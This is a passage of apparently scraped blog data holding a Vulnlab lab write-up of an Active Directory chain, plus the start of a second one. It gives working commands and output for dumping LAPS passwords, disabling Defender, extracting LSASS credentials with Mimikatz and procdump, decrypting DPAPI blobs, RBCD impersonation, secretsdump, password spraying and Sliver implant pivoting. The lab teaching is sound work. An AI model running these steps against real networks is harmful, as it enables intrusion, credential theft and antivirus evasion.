-----------------   </span><br><span class=\"line\"> 1   b&#x27;abbie.smith&#x27;    b&#x27;[...snip...]&#x27;   </span><br><span class=\"line\"></span><br><span class=\"line\"> 2   b&#x27;dorothy.rose&#x27;   b&#x27;[...snip...]&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>This gives us the credentials to both <code>abbie.smith</code> and <code>dorothy.rose</code>, both being domain users within the AD instance of this chain. At this point - we should be fine to close out of NTLM relay for now as we won’t need it anymore.</p>\n<h1 id=\"Domain-Enumeration-with-Bloodhound\"><a href=\"#Domain-Enumeration-with-Bloodhound\" class=\"headerlink\" title=\"Domain Enumeration with Bloodhound\"></a>Domain Enumeration with Bloodhound</h1><p>While we weren’t able to query LDAP earlier since we were using accounts that cause the untrusted domain rule to execute, we now have proper domain user credentials meaning we can query LDAP as we normally would. Let’s dump the domain with these credentials using the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Bloodhound Python ingestor</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;reflection.vl&#x27; -u &#x27;abbie.smith&#x27; -p &#x27;[...snip...]&#x27; -c all -ns 10.10.255.149 --zip</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have all of the domain objects dumped to a compressed archive, we can load these into <a href=\"https://github.com/BloodHoundAD/BloodHound\">Bloodhound</a>.</p>\n<p>After uploading them to the Bloodhound database, let’s take a look at some of the users that we can potentially exploit to get onto one of the workstations. Note that although you have credentials to <code>abbie.smith</code> and <code>dorothy.rose</code>, they do NOT have access to WinRM or RDP or either of the <code>WS01</code> or <code>MS01</code> workstations.</p>\n<p>When looking around at the accounts that we currently have control over, I noticed that one of the users, <code>abbie.smith</code>, has a notable outbound object control. </p>\n<p><img src=\"/images/vulnlab/reflection-vl/d.png\"></p>\n<p>It seems that <code>abbie.smith</code> has <code>GenericAll</code> over the <code>MS01</code> workstation. This specific object control is otherwise known as full control, meaning the <code>MS01</code> workstation allows <code>abbie.smith</code> to manipulate it however it may wish. Normally if we had <code>GenericAll</code> over a domain user, we would just be able to change the domain user’s password with <code>bloodyAD</code>. That being said, we have this privilege over the machine itself instead of a specific user.</p>\n<p>There are a few things that we can try, notably resource-based constrained delegation (RBCD) or local administrator password solution (LAPS) exploitation. The only issue with RBCD is that we do not have control of a machine that has an SPN set to do this. We also can’t add a computer due to both <code>abbie.smith</code> and <code>dorothy.rose</code> having a MachineAccountQuota (MAQ) value of 0. We would need a MAQ value of either 1 or above to be able to do this.</p>\n<h1 id=\"Reading-LAPS-Password-for-MS01\"><a href=\"#Reading-LAPS-Password-for-MS01\" class=\"headerlink\" title=\"Reading LAPS Password for MS01\"></a>Reading LAPS Password for MS01</h1><p>Thus, let’s try exploiting <a href=\"https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview\">LAPS</a>. This specific service is a Windows feature within most Active Directory environments and Microsoft Entra environments. It essentially backs up the password of the local administrator account of the machine it is enabled on and acts like a cache that stores the respective administrator password. Due to us having <code>GenericAll</code> over the machine account, we can read the LAPS password of the Administrator account on this workstation.</p>\n<p>Easily enough <code>crackmapexec</code> has a built-in module to do this, which will dump the LAPS password of the <code>MS01</code> machine. We’ll need to point our request to LDAP on the DC first before specifically reading the LAPS password of the Administrator on <code>MS01</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.255.149 -u &#x27;abbie.smith&#x27; -p &#x27;[...snip...]&#x27; --kdcHost 10.10.255.150 -M laps</span><br><span class=\"line\">SMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.255.149   389    DC01             [+] reflection.vl\\abbie.smith:[...snip...]</span><br><span class=\"line\">LAPS        10.10.255.149   389    DC01             [*] Getting LAPS Passwords</span><br><span class=\"line\">LAPS        10.10.255.149   389    DC01             Computer: MS01$                Password: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the password was dumped successfully. Note that this exploit would only work if LAPS was actually running on the target and we had the respective privilege to be able to dump it.</p>\n<p>Now that we have the password for that user, we should be able to log in as them. Although testing your credentials <code>crackmapexec</code> onto services such as WinRM or RDP on this workstation would come back negative, you can still log in as you normally would through either of those services. Let’s use them to log in to WinRM using <code>evil-winrm</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.255.150 -u &#x27;Administrator&#x27; -p &#x27;[...snip...]&#x27; </span><br><span class=\"line\">    </span><br><span class=\"line\">Evil-WinRM shell v3.5</span><br><span class=\"line\"></span><br><span class=\"line\">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                           </span><br><span class=\"line\">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class=\"line\"></span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cat C:\\Users\\Administrator\\Desktop\\flag.txt</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have control over the <code>MS01</code> workstation, we can read the first flag as seen above.</p>\n<h1 id=\"Pivoting-to-WS01\"><a href=\"#Pivoting-to-WS01\" class=\"headerlink\" title=\"Pivoting to WS01\"></a>Pivoting to WS01</h1><p>Let’s now turn our attention to the next part of the chain, as we’ll need to escalate to the other workstations on the environment. Given the rule of thumb with these chains, I’m assuming that we’ll need to compromise <code>WS01</code> first before the DC.</p>\n<p>We’ll take a look at Bloodhound again to see if there are any domain user objects that we can use pivot to <code>WS01</code>. I first searched through the <code>domain users</code> group and selected all of the <code>Direct Members</code> to view every user account on the domain. </p>\n<p>I immediately saw something different here with another user on the domain, that user being <code>Georgia.Price</code>.</p>\n<p><img src=\"/images/vulnlab/reflection-vl/e.png\"></p>\n<p>As you can see from the screenshot above, it seems as though <code>Georgia.Price</code> has the same <code>GenericAll</code> permissions that <code>abbie.smith</code> had, this time being on <code>WS01</code>. This means with <code>Georgia.Price</code>‘s credentials, we should be able to either read the LAPS password or exploit RBCD on <code>WS01</code>. The only stipulate here is that we do not current possess those credentials.</p>\n<h1 id=\"Credential-Hunting-on-MS01\"><a href=\"#Credential-Hunting-on-MS01\" class=\"headerlink\" title=\"Credential Hunting on MS01\"></a>Credential Hunting on MS01</h1><p>Now that we have the ability to enumerate <code>MS01</code>, we can do a bit of credential hunting to see if we can find the password for <code>Georgia.Price</code>. I stood up a <a href=\"https://github.com/BishopFox/sliver\">Sliver C2</a> server so we can easily transfer files without needing to curl our binaries to the respective machines we control.</p>\n<p>We’ll need to disable AV first before getting our implant onto <code>MS01</code>, we have the ability to do that given that we are the Administrator on the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; Set-MpPreference -DisableRealTimeMonitoring $true</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/reflection-vl/f.png\"></p>\n<p>There are a few things that we can do to try and hunt for this password, I’ll show three methods that I tried initially before showing the solution. While these first two solutions are not the answer for retrieving the credentials for <code>Georgia.Price</code>, they are helpful to try in other scenarios.</p>\n<p>Firstly what comes to mind, since we have access to the local Administrator account on <code>MS01</code>, we can dump all of the cached credentials in memory. We’ll do so by dropping <a href=\"https://github.com/ParrotSec/mimikatz\">Mimikatz</a> to the filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; .\\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">mimikatz(commandline) # exit</span><br></pre></td></tr></table></figure>\n\n<p>This should dump all of the cached credentials, though none of them seem to be of use. If <code>Georgia.Price</code> did have a cached credential, it would be here. We do see <code>svc_web_staging</code>‘s plaintext password, however this doesn’t seem to be of help to us.</p>\n<p>Next thing we could try is retrieving the LSASS from this machine and reading the machine secrets to see if there are any passwords stored here. You might think that we just did that with Mimikatz above, however doing this can also dump the master keys and GUIDs for any cached DPAPI credentials stored on the machine.</p>\n<p>First, you’ll need to dump the LSASS on the remote machine. While you can do it straight from Sliver, this is incredibly loud and also the potential to crash your session since AV can still track this large handle even though we’ve disabled it in our current process. There are alternatives to this, notably using <a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\">procdump</a> which is not picked up by AV as a malicious executable. The great thing about using <code>procdump</code> is that I found the executable for it within <code>C:\\Tools</code>, meaning we don’t need to transfer it from our Kali machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Tools&gt; .\\procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Tools&gt; mv lsass.dmp C:\\Users\\Administrator\\Documents</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the LSASS dumped to a file, we’ll put it to our Kali machine through Sliver and read it with <code>pypykatz</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ pypykatz lsa minidump lsass.dmp</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">== DPAPI [3e7]==</span><br><span class=\"line\">luid 999</span><br><span class=\"line\">key_guid d0486e64-ff99-4f38-8962-56d7767effbd</span><br><span class=\"line\">masterkey ca00bf269b1c1879ad1d664d6fadd9d4169b408e953d9acfece3476622fccc85c72b0e9879222b12a08ec6ee3f1c55d5b772d3d404c520c886413321af99caf0</span><br><span class=\"line\">sha1_masterkey 21a9c244e05002762c3b3f51845a58677a921e2e</span><br><span class=\"line\">== DPAPI [3e7]==</span><br><span class=\"line\">luid 999</span><br><span class=\"line\">key_guid e233b32e-4d94-4f33-8404-b89d08003375</span><br><span class=\"line\">masterkey 73694a6e64f4ff7947bdad1cc3fe941df4deb26b33060405eab4ce3225db174bd6e0045c1dd2d7b50403f60fc9ce01b908f1925c937f77be3fa85e24db2c6d68</span><br><span class=\"line\">sha1_masterkey 10134d260068b772beec3f5c7e8a6828b68d2023</span><br><span class=\"line\">== DPAPI [3e7]==</span><br><span class=\"line\">luid 999</span><br><span class=\"line\">key_guid ea60aa58-d914-4cb4-a993-ca09a343fc78</span><br><span class=\"line\">masterkey a91c09519bbf0b28ca662f8c0b8f680b5902f9e99438df44d6e2563ca5156259ece153cc041dce1dca518f633d299adb530d37686218a5d84e409a600468b20d</span><br><span class=\"line\">sha1_masterkey b4ac52b7d91b71f7010a9aed39e35ea92e8391b0</span><br></pre></td></tr></table></figure>\n\n<p>We’ll take note of these DPAPI credential master keys for now.</p>\n<p>Lastly, you can also try enumerating scheduled tasks. We can do so by dumping all tasks and their attributes using <code>schtasks</code> in our WinRM session. I learned to do during my time doing <a href=\"https://dan-feliciano.com/2024/06/05/tengu/\">Tengu</a>, which is also a great machine to try for practice.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; schtasks /query /v /fo LIST &gt; tasklist.txt</span><br></pre></td></tr></table></figure>\n\n<p>We can pull this to our local Kali machine through Sliver to read it. I found an interesting task denoted as <code>\\Backup</code> that seems to be owned by <code>Georgia.Price</code>.</p>\n<p><img src=\"/images/vulnlab/reflection-vl/g.png\"></p>\n<p>This task seems to be running as that user, which prompts us to attempt to see if we can edit it. Luckily enough we don’t have to do that through PowerShell, as we have Administrator access to RDP so we can just do it through the Task Scheduler GUI. The only issue with this method is that we are required to enter <code>Georgia.Price</code>‘s credentials in order to edit the scheduled task. If we had the ability to do this, we could easily MITM the <code>ls</code> request and point it to Responder, to which we could then try to crack the NetNTLMv2 hash that we’d receive.</p>\n<h1 id=\"Dumping-DPAPI-Cached-Credentials\"><a href=\"#Dumping-DPAPI-Cached-Credentials\" class=\"headerlink\" title=\"Dumping DPAPI Cached Credentials\"></a>Dumping DPAPI Cached Credentials</h1><p>So pulling this all together, it does not seem that any of the aforementioned methods are usable to receive <code>Georgia.Price</code>‘s plaintext credentials. However, as I showed from before we do have access to a few master keys that may correspond to cached DPAPI credentials.</p>\n<p>We can run <a href=\"https://github.com/GhostPack/Seatbelt\">Seatbelt</a> from Sliver C2, you could also compile it with Visual Studio and drop the executable to the filesystem. The Sliver armory contains <code>seatbelt</code> so we’ll just do it from there.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (reflection) &gt; seatbelt WindowsCredentialFiles</span><br><span class=\"line\">......</span><br><span class=\"line\">  Folder : C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials</span><br><span class=\"line\"></span><br><span class=\"line\">    FileName     : 2A5FD8B6E555858DE1974096F0A5DD39</span><br><span class=\"line\">    Description  : Local Credential Data</span><br><span class=\"line\">    MasterKey    : d0486e64-ff99-4f38-8962-56d7767effbd</span><br><span class=\"line\">    Accessed     : 6/7/2023 12:22:44 PM</span><br><span class=\"line\">    Modified     : 6/7/2023 12:22:44 PM</span><br><span class=\"line\">    Size         : 576</span><br></pre></td></tr></table></figure>\n\n<p>If you remember earlier, the master key was a relatively long string of text at the bottom of our DMP file. That is the unencrypted master key, which normally we would use the corresponding GUID to decrypt it. Luckily enough, now that we have the decrypted master key, we just need to plug the right one into its respective credential file.</p>\n<p>I left one of the credential files in the above output as it corresponds to the GUID that was listed for one of the DPAPI master keys from the DMP file. There is another credential file with the same GUID, however I found after some testing that it is not the correct credential file for us to exploit. This just takes some trial and error if you have the same GUID for multiple master keys.</p>\n<p>If we have the correct master key and its corresponding credential file, we should be able to dump the credential blob (otherwise being the plaintext password) for the user it belongs to. I’ll put all of the respective attributes that we have to dump the credential blob.</p>\n<ul>\n<li>Key GUID - <code>d0486e64-ff99-4f38-8962-56d7767effbd</code></li>\n<li>Master Key - <code>ca00bf269b1c1879ad1d664d6fadd9d4169b408e953d9acfece3476622fccc85c72b0e9879222b12a08ec6ee3f1c55d5b772d3d404c520c886413321af99caf0</code></li>\n<li>Credential File - <code>C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\2A5FD8B6E555858DE1974096F0A5DD39</code></li>\n</ul>\n<p>Given that we have all of the assets required, let’s use Mimikatz once more to dump the credential blob. I’ve found that running through WinRM prompts an error, however if you log in as the Administrator through RDP it should work as intended.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\Administrator\\Documents&gt; .\\mimikatz.exe &quot;dpapi::cred /in:C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\2A5FD8B6E555858DE1974096F0A5DD39 /masterkey:ca00bf269b1c1879ad1d664d6fadd9d4169b408e95[...snip...]3f1c55d5b772d3d404c520c886413321af99caf0&quot; &quot;exit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">......</span><br><span class=\"line\">  TargetName     : Domain:batch=TaskScheduler:Task:&#123;013CD3ED-72CB-4801-99D7-8E7CA1F7E370&#125;</span><br><span class=\"line\">  UnkData        : (null)</span><br><span class=\"line\">  Comment        : (null)</span><br><span class=\"line\">  TargetAlias    : (null)</span><br><span class=\"line\">  UserName       : REFLECTION\\Georgia.Price</span><br><span class=\"line\">  CredentialBlob : [...snip...]</span><br><span class=\"line\">  Attributes     : 0</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, this credential file seemed to correspond to <code>Georgia.Price</code>. Our theory for task scheduler from before was half correct, as the plaintext password for the user is stored on this task. The credential blob that we dumped corresponded to this specific task scheduler credential attribute, as this is where it is stored.</p>\n<h1 id=\"Exploiting-Resource-Based-Constrained-Delegation\"><a href=\"#Exploiting-Resource-Based-Constrained-Delegation\" class=\"headerlink\" title=\"Exploiting Resource-Based Constrained Delegation\"></a>Exploiting Resource-Based Constrained Delegation</h1><p>We can now use the <code>GenericAll</code> permissions as <code>Georgia.Price</code> to exploit the <code>WS01</code> workstation.</p>\n<p>I tested for LAPS once again to see if we could read the corresponding LAPS password, however I did not come back with any results. This is because unlike <code>MS01</code>, <code>WS01</code> does not have LAPS configured to run.</p>\n<p>Despite this, we do have another exploit that we can test - RBCD. Resource-based constrained delegation essentially allows us to utilize a compromised machine account to request for a service ticket in which we impersonate the user that it belongs to. The reason that this did not work before is that we did not have control over a machine account that could do this. However, now that we do have one being <code>MS01$</code>, we can exploit this functionality.</p>\n<p>We’ll first need to set the delegation properties between <code>MS01$</code> and <code>WS01$</code> respectively so that <code>MS01</code> can perform delegation on behalf of users in <code>WS01</code>. Impacket has a utility to do this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-rbcd -delegate-from &#x27;MS01$&#x27; -delegate-to &#x27;WS01$&#x27; -action &#x27;write&#x27; &#x27;reflection.vl/georgia.price:[...snip...]&#x27;</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class=\"line\">[*] Delegation rights modified successfully!</span><br><span class=\"line\">[*] MS01$ can now impersonate users on WS01$ via S4U2Proxy</span><br><span class=\"line\">[*] Accounts allowed to act on behalf of other identity:</span><br><span class=\"line\">[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have that set, we can now exploit S4U2Proxy to request for a service ticket to CIFS (being SMB) as the Administrator user.</p>\n<p>The only stipulate here is that we’ll need the plaintext password of the <code>MS01$</code> machine account to do this. We did dump all the credentials to the <code>MS01</code> machine earlier from Mimikatz, so we can use the machine account’s NTLM hash and pass-the-hash to Impacket command we’re about to run.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-getST -spn &#x27;cifs/ws01.reflection.vl&#x27; -impersonate &#x27;Administrator&#x27; &#x27;reflection.vl/MS01$&#x27; -hashes :548f3a[...snip...]0eaadb1</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[-] CCache file is not found. Skipping...</span><br><span class=\"line\">[*] Getting TGT for user</span><br><span class=\"line\">[*] Impersonating Administrator</span><br><span class=\"line\">[*] Requesting S4U2self</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[*] Saving ticket in Administrator@cifs_ws01.reflection.vl@REFLECTION.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have a saved Kerberos service ticket as the Administrator user, we can now dump the secrets of <code>WS01</code> remotely with <code>secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-secretsdump -k ws01.reflection.vl                                  </span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Service RemoteRegistry is in stopped state</span><br><span class=\"line\">[*] Service RemoteRegistry is disabled, enabling it</span><br><span class=\"line\">[*] Starting service RemoteRegistry</span><br><span class=\"line\">......</span><br><span class=\"line\">REFLECTION\\WS01$:aad3b435b51404eeaad3b435b51404ee:755b20085[...snip...]4c9e:::</span><br><span class=\"line\">[*] DefaultPassword </span><br><span class=\"line\">reflection.vl\\Rhys.Garner:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>This will eventually dump the password for <code>Rhys.Garner</code>, who is a local administrator on <code>WS01</code>. This means using their credentials we should be able to authenticate to RDP to this workstation. I found that WinRM authentication wasn’t working me, so RDP is another alternative.</p>\n<p><img src=\"/images/vulnlab/reflection-vl/h.png\"></p>\n<p>As you can see, the second flag is within the Desktop directory for this user.</p>\n<h1 id=\"Pivoting-to-DC01\"><a href=\"#Pivoting-to-DC01\" class=\"headerlink\" title=\"Pivoting to DC01\"></a>Pivoting to DC01</h1><p>So our next and final step to compromising this environment is to take control over the DC from here. Note that if we want to get a session as SYSTEM on <code>WS01</code>, we can use Sliver’s built-in <code>getsystem</code> command which will spawn a new session as SYSTEM.</p>\n<p>I tried a few different tactics such as viewing the cached Kerberos credentials on this machine, to which I found that there was an <code>LDAP</code> cached ticket for <code>Rhys.Garner</code> from the DC. I tried a few tactics that came to mind when I saw this, such as requesting for an alternate service name for CIFS on the DC. That did not seem to work, so I decided to pivot elsewhere. There are also no credentials or applications that we could exploit on this machine, so the exploit has to be externally through AD ACLs.</p>\n<p>Now when I had figured out what to do, it seemed incredibly simple in hindsight. This is a tactic that is always worth a try to give if you have credentials, which is the idea of password reusage. Spraying passwords that you currently own to other users is never a bad idea unless you’re in an environment that restricts brute-forcing. In our case, that does not seem to be an issue.</p>\n<p>I pulled all of the users from Bloodhound and placed them into a wordlist, you can do so just simply by creating a text file and reading from all of the domain user nodes.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat ul.txt    </span><br><span class=\"line\">dom_rgarner</span><br><span class=\"line\">svc_web_prod</span><br><span class=\"line\">svc_web_staging</span><br><span class=\"line\">deborah.collins</span><br><span class=\"line\">jeremy_marshall</span><br><span class=\"line\">rhys.garner</span><br><span class=\"line\">dylan.marsh</span><br><span class=\"line\">dorothy.rose</span><br><span class=\"line\">craig.williams</span><br><span class=\"line\">bethany.wright</span><br><span class=\"line\">abbie.smith</span><br><span class=\"line\">michael.wilkinson</span><br><span class=\"line\">labadm</span><br><span class=\"line\">georgia.price</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have this user list, let’s see if <code>georgia.price</code> shares a password with any of these users. We can do so with <code>crackmapexec</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.255.149 -u ul.txt -p &#x27;[...snip...]&#x27;   </span><br><span class=\"line\">SMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.255.149   445    DC01             [+] reflection.vl\\dom_rgarner:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>We can see that a successful authentication attempt came back for <code>dom_rgarner</code>. I verified that the user <code>dom_rgarner</code> is a domain admin and also has access to WinRM on the DC. You can view this in Bloodhound on the user’s node.</p>\n<p>So given that we have access to a domain admin, we can now take hold of the DC and authenticate to it to complete this chain. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.255.149 -u &#x27;dom_rgarner&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\"> </span><br><span class=\"line\">Evil-WinRM shell v3.5</span><br><span class=\"line\">   </span><br><span class=\"line\">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                        </span><br><span class=\"line\">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class=\"line\"> </span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\dom_rgarner\\Documents&gt; cat C:\\Users\\Administrator\\Desktop\\flag.txt</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\dom_rgarner\\Documents&gt; hostname</span><br><span class=\"line\">dc01</span><br></pre></td></tr></table></figure>\n\n<p>As seen above, we are able to read the last flag within the Administrator home directory. This means that we have successfully compromised this chain!</p>\n<p><img src=\"/images/vulnlab/reflection-vl/i.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This chain was very fun, and it definitely was a hard-hitter for Windows pivoting and privilege escalation. Learning how to do NTLM relay was very different, and I believe that it definitely helped with strengthening some skills. Big thanks to xct and r0BIT for developing this chain, it was great!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py\">https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://github.com/BloodHoundAD/BloodHound\">https://github.com/BloodHoundAD/BloodHound</a><br><a href=\"https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview\">https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://github.com/ParrotSec/mimikatz\">https://github.com/ParrotSec/mimikatz</a><br><a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\">https://learn.microsoft.com/en-us/sysinternals/downloads/procdump</a><br><a href=\"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz\">https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz</a><br><a href=\"https://dan-feliciano.com/2024/06/05/tengu/\">https://dan-feliciano.com/2024/06/05/tengu/</a><br><a href=\"https://github.com/GhostPack/Seatbelt\">https://github.com/GhostPack/Seatbelt</a></p>\n"},{"title":"Heron - Vulnlab","date":"2024-06-28T20:56:03.000Z","keywords":"Vulnlab, Medium, Linux, Windows","description":"This is the newest chain in the medium difficulty that was created by xct, I'm going into this relatively blind so I hope I'll be able to relay the info that I know correctly. It involves an assumed breach scenario within a domain-joined Linux machine, requiring a pivot takeover to the domain controller for completion.","cover":"/images/vulnlab/heron-vl/heron_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis is the newest chain in the medium difficulty that was created by xct, I'm going into this relatively blind so I hope I'll be able to relay the info that I know correctly. It involves an assumed breach scenario within a domain-joined Linux machine, requiring a pivot takeover to the domain controller for completion. \n\nI want to thank both xct and otter for their help on this during the initial access portion of the chain, overthinking is a common attribute to have when you start out as a red teamer so it's important to keep it simple (at least that's what I learned for initial access during this chain).\n\n# Enumeration\n\nLet's do our usual NMAP scans.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 20:48 EDT\nNmap scan report for 10.10.128.117\nHost is up (0.10s latency).\nAll 1000 scanned ports on 10.10.186.21 are in ignored states.\nNot shown: 1000 filtered tcp ports (no-response)\n\nNmap done: 1 IP address (1 host up) scanned in 113.11 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 20:50 EDT\nNmap scan report for 10.10.128.118\nHost is up (0.12s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 17.67 seconds\n```\n\nThere doesn't seem to be much for us to work with here. From my first guess, every port within the domain controller `.21` is behind a firewall. This means we won't be able to access it until after we have taken control of the first machine. Furthermore this also means we have no way to identify any users directly from the DC due to Kerberos not being accessible.\n\nWe'll have to start from SSH on the domain-joined Linux machine, as this seems to be the only port available. I also made sure to confirm this as the case with `rustscan`, which you can find [here](https://github.com/RustScan/RustScan). It's a modernized version of NMAP, and is used for discovering ports at an increased pace.\n\nLuckily enough I gave a quick peek at the Wiki page for the machine and it seems that this is an assumed-breach scenario. Heron Corp has given us credentials from which to use for our pen-test.\n\n```\npentest:Heron123!\n\n└─$ ssh pentest@10.10.128.118\n......\nLast login: Fri Jun  7 10:34:38 2024 from 10.8.0.101\npentest@frajmp:~$\n```\n\n# SOCKS Proxy to the DC\n\nSo as explained earlier, the first part of this chain is looking through the domain-joined Linux machine and understanding if there are any ways to elevate to root. Given that the first machine of this chain is through the Linux machine, I'm assuming that once we obtain root access we should have the ability to use the machine account and the `/etc/krb5.keytab` file (containing the machine account's NT hash) to compromise the DC.\n\nHowever after a bit of file enumeration, you'll notice that there isn't really much for you to exploit initially. We don't have access to any of the users (nor are there any binaries for us to exploit as the `pentest` user, however there are two domain users in the `/home` directory which are `svc-web-accounting` and `svc-web-accounting-d`. Since we have these users, we can try to kerberoast/ASREProast to try and decrypt their plaintext passwords. In order to even do this though, we'll need to interact with the DC.\n\nSince we don't have access to the DC directly from our local machine, we can use a proxy determine if the jumpbox is able to connect to it due to it being within the scope of the firewall (or at least there seems to be a firewall active). We'll need to start up a SOCKS proxy on the jumpbox in order to do this, and then execute our commands through the proxy. I usually opt to use `proxychains` for this, though you are free to use other tools that accomplish the same result.\n\nI'll start up a [Sliver C2](https://github.com/BishopFox/sliver) server on our local Kali machine, I'm mainly doing this because Sliver has a built in SOCKS proxy command that should start a proxy on a given port easily. Firstly, we'll need to create an implant and curl it to the jumpbox.\n\n```\nsliver > generate --mtls (KALI IP) --os linux --arch amd64 --skip-symbols --save /home/daz/tech/vl/heron/writeup/ --name heron_lin\n```\n\n![](/images/vulnlab/heron-vl/b.png)\n\n```\nsliver > mtls\n\n[*] Starting mTLS listener ...\n\n[*] Successfully started job #1\n\n[*] Session 39b2e695 heron_lin - 10.10.128.118:37554 (frajmp.heron.vl) - linux/amd64 - Thu, 27 Jun 2024 23:34:54 EDT\n```\n\nNow that we have an implant on the jumpbox, we can start up a SOCKS proxy as explained earlier using `socks5 start`. The default port for the proxy should be running on port 1081, though it may be different for 